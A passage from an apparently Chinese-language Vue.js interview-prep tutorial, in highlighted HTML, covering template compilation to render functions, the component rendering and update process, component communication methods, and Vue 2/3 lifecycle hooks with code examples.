<span class="token keyword">with</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">(</span>flag <span class="token operator">===</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">_c</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token function">_v</span><span class="token punctuation">(</span><span class="token string">&quot;A&quot;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">_c</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token function">_v</span><span class="token punctuation">(</span><span class="token string">&quot;B&quot;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span>

<span class="token comment">// 循环</span>
<span class="token keyword">const</span> template <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;ul&gt;
        &lt;li v-for=&quot;item in list&quot; :key=&quot;item.id&quot;&gt;{{item.title}}&lt;/li&gt;
    &lt;/ul&gt;
</span><span class="token template-punctuation string">`</span></span>
<span class="token keyword">with</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token string">'ul'</span><span class="token punctuation">,</span><span class="token function">_l</span><span class="token punctuation">(</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token literal-property property">key</span><span class="token operator">:</span>item<span class="token punctuation">.</span>id<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token function">_v</span><span class="token punctuation">(</span><span class="token function">_s</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>title<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">}</span>

<span class="token comment">// 事件</span>
<span class="token keyword">const</span> template <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;button @click=&quot;clickHandler&quot;&gt;submit&lt;/button&gt;
</span><span class="token template-punctuation string">`</span></span>
<span class="token keyword">with</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token string">'button'</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token literal-property property">on</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token string-property property">&quot;click&quot;</span><span class="token operator">:</span>clickHandler<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token function">_v</span><span class="token punctuation">(</span><span class="token string">&quot;submit&quot;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span>

<span class="token comment">// v-model</span>
<span class="token keyword">const</span> template <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;input type=&quot;text&quot; v-model=&quot;name&quot;&gt;</span><span class="token template-punctuation string">`</span></span>
<span class="token comment">// 主要看 input 事件</span>
<span class="token keyword">with</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token literal-property property">directives</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">&quot;model&quot;</span><span class="token punctuation">,</span><span class="token literal-property property">rawName</span><span class="token operator">:</span><span class="token string">&quot;v-model&quot;</span><span class="token punctuation">,</span><span class="token literal-property property">value</span><span class="token operator">:</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token literal-property property">expression</span><span class="token operator">:</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token literal-property property">attrs</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token string-property property">&quot;type&quot;</span><span class="token operator">:</span><span class="token string">&quot;text&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">domProps</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token string-property property">&quot;value&quot;</span><span class="token operator">:</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">on</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token string-property property">&quot;input&quot;</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">$event</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>$event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>composing<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">;</span>name<span class="token operator">=</span>$event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>

<span class="token comment">// render 函数</span>
<span class="token comment">// 返回 vnode</span>
<span class="token comment">// patch</span>

<span class="token comment">// 编译</span>
<span class="token keyword">const</span> res <span class="token operator">=</span> compiler<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>template<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>render<span class="token punctuation">)</span>

<span class="token comment">// ---------------分割线--------------</span>

<span class="token comment">// 从 vue 源码中找到缩写函数的含义</span>
<span class="token keyword">function</span> <span class="token function">installRenderHelpers</span> <span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    target<span class="token punctuation">.</span>_o <span class="token operator">=</span> markOnce<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_n <span class="token operator">=</span> toNumber<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_s <span class="token operator">=</span> toString<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_l <span class="token operator">=</span> renderList<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_t <span class="token operator">=</span> renderSlot<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_q <span class="token operator">=</span> looseEqual<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_i <span class="token operator">=</span> looseIndexOf<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_m <span class="token operator">=</span> renderStatic<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_f <span class="token operator">=</span> resolveFilter<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_k <span class="token operator">=</span> checkKeyCodes<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_b <span class="token operator">=</span> bindObjectProps<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_v <span class="token operator">=</span> createTextVNode<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_e <span class="token operator">=</span> createEmptyVNode<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_u <span class="token operator">=</span> resolveScopedSlots<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_g <span class="token operator">=</span> bindObjectListeners<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_d <span class="token operator">=</span> bindDynamicKeys<span class="token punctuation">;</span>
    target<span class="token punctuation">.</span>_p <span class="token operator">=</span> prependModifier<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="vue组件渲染过程"><a href="#vue组件渲染过程" class="header-anchor">#</a> Vue组件渲染过程</h3> <p><strong>前言</strong></p> <ul><li>一个组件渲染到页面，修改<code>data</code>触发更新（数据驱动视图）</li> <li>其背后原理是什么，需要掌握哪些点</li> <li>考察对流程了解的全面程度</li></ul> <p><strong>回顾三大核心知识点</strong></p> <ul><li><strong>响应式</strong>：监听<code>data</code>属性<code>getter</code>、<code>setter</code>（包括数组）</li> <li><strong>模板编译</strong>：模板到<code>render</code>函数，再到<code>vnode</code></li> <li><strong>vdom</strong>：两种用法
<ul><li><code>patch(elem,vnode)</code> 首次渲染<code>vnode</code>到<code>container</code>上</li> <li><code>patch(vnode、newVnode)</code> 新的<code>vnode</code>取更新旧的<code>vnode</code></li></ul></li> <li>搞定这三点核心原理，<code>vue</code>原理不是问题</li></ul> <p><strong>组件渲染更新过程</strong></p> <ul><li><strong>1. 初次渲染过程</strong> <ul><li>解析模板为<code>render</code>函数（或在开发环境已经完成<code>vue-loader</code>）</li> <li>触发响应式，监听<code>data</code>属性<code>getter</code>、<code>setter</code></li> <li>执行<code>render</code>函数（执行<code>render</code>函数过程中，会获取<code>data</code>的属性触发<code>getter</code>），生成<code>vnode</code>，在执行<code>patch(elem,vnode)</code> <code>elem</code>组件对应的<code>dom</code>节点
<ul><li><code>const template = &lt;p&gt;&lt;/p&gt;</code></li> <li>编译为<code>render</code>函数 <code>with(this){return _c('p', [_v(_s(message))])}</code></li> <li><code>this</code>就是<code>vm</code>的实例, <code>message</code>等变量会从<code>vm</code>上读取，触发<code>getter</code>进行依赖收集</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span>
            <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'hello'</span> <span class="token comment">// render函数执行过程中会获取message变量值，触发getter</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div></li></ul></li> <li><strong>2. 更新过程</strong> <ul><li>修改<code>data</code>，触发<code>setter</code>（此前在<code>getter</code>中已被监听）</li> <li>重新执行<code>render</code>函数，生成<code>newVnode</code></li> <li>在调用<code>patch(oldVnode, newVnode)</code>算出最小差异，进行更新</li></ul></li> <li><strong>3. 完成流程图</strong> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/94729fa5b9fcb082.png" loading="lazy" class="lazy"></li></ul> <p><strong>异步渲染</strong></p> <ul><li>汇总<code>data</code>的修改，一次更新视图</li> <li>减少<code>DOM</code>操作次数，提高性能</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/6c8606aaa99af5cb.png" loading="lazy" class="lazy"></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token function">addItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>

        <span class="token comment">// 1.页面渲染是异步的，$nextTick待渲染完在回调</span>
        <span class="token comment">// 2.页面渲染时会将data的修改做整合，多次data修改也只会渲染一次</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$nextTick</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
            <span class="token keyword">const</span> ulElem <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>ul
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ulElem<span class="token punctuation">.</span>childNotes<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>总结</strong></p> <ul><li>渲染和响应式的关系</li> <li>渲染和模板编译的关系</li> <li>渲染和<code>vdom</code>的关系</li></ul> <h3 id="vue组件之间通信方式有哪些"><a href="#vue组件之间通信方式有哪些" class="header-anchor">#</a> Vue组件之间通信方式有哪些</h3> <blockquote><p>Vue 组件间通信是面试常考的知识点之一，这题有点类似于开放题，你回答出越多方法当然越加分，表明你对 Vue 掌握的越熟练。<strong>Vue 组件间通信只要指以下 3 类通信</strong>：<code>父子组件通信</code>、<code>隔代组件通信</code>、<code>兄弟组件通信</code>，下面我们分别介绍每种通信方式且会说明此种方法可适用于哪类组件间通信</p></blockquote> <p><strong>组件传参的各种方式</strong></p> <p><img alt="" data-src="https://s.poetries.work/uploads/2022/08/e6c7ede9c5ab6d49.png" loading="lazy" class="lazy"></p> <p><strong>组件通信常用方式有以下几种</strong></p> <ul><li><code>props / $emit</code> <strong>适用 父子组件通信</strong> <ul><li>父组件向子组件传递数据是通过 <code>prop</code> 传递的，子组件传递数据给父组件是通过<code>$emit</code> 触发事件来做到的</li></ul></li> <li><code>ref</code> 与 <code>$parent / $children(vue3废弃)</code> <strong>适用 父子组件通信</strong> <ul><li><code>ref</code>：如果在普通的 <code>DOM</code> 元素上使用，引用指向的就是 <code>DOM</code> 元素；如果用在子组件上，引用就指向组件实例</li> <li><code>$parent / $children</code>：访问父组件的属性或方法 / 访问子组件的属性或方法</li></ul></li> <li><code>EventBus （$emit / $on）</code> <strong>适用于 父子、隔代、兄弟组件通信</strong> <ul><li>这种方法通过一个空的 <code>Vue</code> 实例作为中央事件总线（事件中心），用它来触发事件和监听事件，从而实现任何组件间的通信，包括父子、隔代、兄弟组件</li></ul></li> <li><code>$attrs / $listeners(vue3废弃)</code> <strong>适用于 隔代组件通信</strong> <ul><li><code>$attrs</code>：包含了父作用域中不被 <code>prop</code> 所识别 (且获取) 的特性绑定 ( <code>class</code> 和 <code>style</code> 除外 )。当一个组件没有声明任何 <code>prop</code> 时，这里会包含所有父作用域的绑定 ( <code>class</code> 和 <code>style</code> 除外 )，并且可以通过 <code>v-bind=&quot;$attrs&quot;</code> 传入内部组件。通常配合 <code>inheritAttrs</code> 选项一起使用，多余的属性不会被解析到标签上</li> <li><code>$listeners</code>：包含了父作用域中的 (不含 <code>.native</code> 修饰器的) <code>v-on</code> 事件监听器。它可以通过 <code>v-on=&quot;$listeners&quot;</code> 传入内部组件</li></ul></li> <li><code>provide / inject</code> <strong>适用于 隔代组件通信</strong> <ul><li>祖先组件中通过 <code>provider</code> 来提供变量，然后在子孙组件中通过 <code>inject</code> 来注入变量。 <code>provide / inject</code> API 主要解决了跨级组件间的通信问题，<strong>不过它的使用场景，主要是子组件获取上级组件的状态</strong>，跨级组件间建立了一种主动提供与依赖注入的关系</li></ul></li> <li><code>$root</code> <strong>适用于 隔代组件通信</strong> 访问根组件中的属性或方法，是根组件，不是父组件。<code>$root</code>只对根组件有用</li> <li><code>Vuex</code> <strong>适用于 父子、隔代、兄弟组件通信</strong> <ul><li><code>Vuex</code> 是一个专为 <code>Vue.js</code> 应用程序开发的状态管理模式。每一个 <code>Vuex</code> 应用的核心就是 <code>store</code>（仓库）。“store” 基本上就是一个容器，它包含着你的应用中大部分的状态 ( <code>state</code> )</li> <li><code>Vuex</code> 的状态存储是响应式的。当 <code>Vue</code> 组件从 <code>store</code> 中读取状态的时候，若 <code>store</code> 中的状态发生变化，那么相应的组件也会相应地得到高效更新。</li> <li>改变 <code>store</code> 中的状态的唯一途径就是显式地提交  (<code>commit</code>) <code>mutation</code>。这样使得我们可以方便地跟踪每一个状态的变化。</li></ul></li></ul> <p><strong>根据组件之间关系讨论组件通信最为清晰有效</strong></p> <ul><li>父子组件：<code>props</code>/<code>$emit</code>/<code>$parent</code>/<code>ref</code></li> <li>兄弟组件：<code>$parent</code>/<code>eventbus</code>/<code>vuex</code></li> <li>跨层级关系：<code>eventbus</code>/<code>vuex</code>/<code>provide+inject</code>/<code>$attrs + $listeners</code>/<code>$root</code></li></ul> <h3 id="vue的生命周期方法有哪些"><a href="#vue的生命周期方法有哪些" class="header-anchor">#</a> Vue的生命周期方法有哪些</h3> <ol><li><code>Vue</code> 实例有一个完整的生命周期，也就是从<code>开始创建</code>、<code>初始化数据</code>、<code>编译模版</code>、<code>挂载Dom -&gt; 渲染</code>、<code>更新 -&gt; 渲染</code>、<code>卸载</code>等一系列过程，我们称这是<code>Vue</code>的生命周期</li> <li><code>Vue</code>生命周期总共分为8个阶段<code>创建前/后</code>，<code>载入前/后</code>，<code>更新前/后</code>，<code>销毁前/后</code></li></ol> <blockquote><p><code>beforeCreate</code> =&gt; <code>created</code> =&gt; <code>beforeMount</code> =&gt; <code>Mounted</code> =&gt; <code>beforeUpdate</code> =&gt; <code>updated</code> =&gt; <code>beforeDestroy</code> =&gt; <code>destroyed</code>。<code>keep-alive</code>下：<code>activated</code> <code>deactivated</code></p></blockquote> <table><thead><tr><th>生命周期vue2</th> <th>生命周期vue3</th> <th>描述</th></tr></thead> <tbody><tr><td><code>beforeCreate</code></td> <td><code>beforeCreate</code></td> <td>在实例初始化之后，数据观测(<code>data observer</code>) 之前被调用。</td></tr> <tr><td><code>created</code></td> <td><code>created</code></td> <td>实例已经创建完成之后被调用。在这一步，实例已完成以下的配置：数据观测(<code>data observer</code>)，属性和方法的运算， <code>watch/event</code> 事件回调。这里没有<code>$el</code></td></tr> <tr><td><code>beforeMount</code></td> <td><code>beforeMount</code></td> <td>在挂载开始之前被调用：相关的 <code>render</code> 函数首次被调用</td></tr> <tr><td><code>mounted</code></td> <td><code>mounted</code></td> <td><code>el</code> 被新创建的 <code>vm.$el</code> 替换，并挂载到实例上去之后调用该钩子</td></tr> <tr><td><code>beforeUpdate</code></td> <td><code>beforeUpdate</code></td> <td>组件数据更新之前调用，发生在虚拟 <code>DOM</code> 打补丁之前</td></tr> <tr><td><code>updated</code></td> <td><code>updated</code></td> <td>由于数据更改导致的虚拟 <code>DOM</code> 重新渲染和打补丁，在这之后会调用该钩子</td></tr> <tr><td><code>beforeDestroy</code></td> <td><code>beforeUnmount</code></td> <td>实例销毁之前调用。在这一步，实例仍然完全可用</td></tr> <tr><td><code>destroyed</code></td> <td><code>unmounted</code></td> <td>实例销毁后调用。调用后， <code>Vue</code> 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。 该钩子在服务器端渲染期间不被调用。</td></tr></tbody></table> <p>其他几个生命周期</p> <table><thead><tr><th>生命周期vue2</th> <th>生命周期vue3</th> <th>描述</th></tr></thead> <tbody><tr><td><code>activated</code></td> <td><code>activated</code></td> <td><code>keep-alive</code>专属，组件被激活时调用</td></tr> <tr><td><code>deactivated</code></td> <td><code>deactivated</code></td> <td><code>keep-alive</code>专属，组件被销毁时调用</td></tr> <tr><td><code>errorCaptured</code></td> <td><code>errorCaptured</code></td> <td>捕获一个来自子孙组件的错误时被调用</td></tr> <tr><td>-</td> <td><code>renderTracked</code></td> <td>调试钩子，响应式依赖被收集时调用</td></tr> <tr><td>-</td> <td><code>renderTriggered</code></td> <td>调试钩子，响应式依赖被触发时调用</td></tr> <tr><td>-</td> <td><code>serverPrefetch</code></td> <td><code>ssr only</code>，组件实例在服务器上被渲染前调用</td></tr></tbody></table> <ol start="3"><li><strong>要掌握每个生命周期内部可以做什么事</strong></li></ol> <ul><li><code>beforeCreate</code> 初始化<code>vue</code>实例，进行数据观测。执行时组件实例还未创建，通常用于插件开发中执行一些初始化任务</li> <li><code>created</code> 组件初始化完毕，可以访问各种数据，获取接口数据等</li> <li><code>beforeMount</code> 此阶段<code>vm.el</code>虽已完成<code>DOM</code>初始化，但并未挂载在<code>el</code>选项上</li> <li><code>mounted</code> 实例已经挂载完成，可以进行一些<code>DOM</code>操作</li> <li><code>beforeUpdate</code> 更新前，可用于获取更新前各种状态。此时<code>view</code>层还未更新，可用于获取更新前各种状态。可以在这个钩子中进一步地更改状态，这不会触发附加的重渲染过程。</li> <li><code>updated</code> 完成<code>view</code>层的更新，更新后，所有状态已是最新。可以执行依赖于 <code>DOM</code> 的操作。然而在大多数情况下，你应该避免在此期间更改状态，因为这可能会导致更新无限循环。 该钩子在服务器端渲染期间不被调用。</li> <li><code>destroyed</code> 可以执行一些优化操作,清空定时器，解除绑定事件</li> <li>vue3 <code>beforeunmount</code>：实例被销毁前调用，可用于一些定时器或订阅的取消</li> <li>vue3 <code>unmounted</code>：销毁一个实例。可清理它与其它实例的连接，解绑它的全部指令及事件监听器</li></ul> <p><img alt="" data-src="https://s.poetries.work/gitee/2020/07/61.png" loading="lazy" class="lazy"></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>app<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>{{name}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'poetries'</span><span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>
        <span class="token function">beforeCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token comment">// 数据观测(data observer) 和 event/watcher 事件配置之前被调用。</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeCreate'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token function">created</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token comment">// 属性和方法的运算， watch/event 事件回调。这里没有$el</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'created'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token function">beforeMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token comment">// 相关的 render 函数首次被调用。</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeMount'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token comment">// 被新创建的 vm.$el 替换</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mounted'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token function">beforeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token comment">//  数据更新时调用，发生在虚拟 DOM 重新渲染和打补丁之前。</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeUpdate'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token function">updated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token comment">//  由于数据更改导致的虚拟 DOM 重新渲染和打补丁，在这之后会调用该钩子。</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'updated'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token function">beforeDestroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token comment">// 实例销毁之前调用 实例仍然完全可用</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeDestroy'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token function">destroyed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
            <span class="token comment">// 所有东西都会解绑定，所有的事件监听器会被移除</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'destroyed'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        vm<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'poetry'</span><span class="token punctuation">;</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            vm<span class="token punctuation">.</span><span class="token function">$destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><ol start="4"><li>组合式API生命周期钩子</li></ol> <p>你可以通过在生命周期钩子前面加上 “<code>on</code>” 来访问组件的生命周期钩子。</p> <p>下表包含如何在 <code>setup()</code> 内部调用生命周期钩子：</p> <table><thead><tr><th>选项式 API</th> <th>Hook inside setup</th></tr></thead> <tbody><tr><td><code>beforeCreate</code></td> <td>不需要*</td></tr> <tr><td><code>created</code></td> <td>不需要*</td></tr> <tr><td><code>beforeMount</code></td> <td><code>onBeforeMount</code></td></tr> <tr><td><code>mounted</code></td> <td><code>onMounted</code></td></tr> <tr><td><code>beforeUpdate</code></td> <td><code>onBeforeUpdate</code></td></tr> <tr><td><code>updated</code></td> <td><code>onUpdated</code></td></tr> <tr><td><code>beforeUnmount</code></td> <td><code>onBeforeUnmount</code></td></tr> <tr><td><code>unmounted</code></td> <td><code>onUnmounted</code></td></tr> <tr><td><code>errorCaptured</code></td> <td><code>onErrorCaptured</code></td></tr> <tr><td><code>renderTracked</code></td> <td><code>onRenderTracked</code></td></tr> <tr><td><code>renderTriggered</code></td> <td><code>onRenderTriggered</code></td></tr></tbody></table> <blockquote><p>因为 <code>setup</code> 是围绕 <code>beforeCreate</code> 和 <code>created</code> 生命周期钩子运行的，所以不需要显式地定义它们。换句话说，在这些钩子中编写的任何代码都应该直接在 <code>setup</code> 函数中编写</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
  <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// mounted</span>
    <span class="token function">onMounted</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Component is mounted!'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
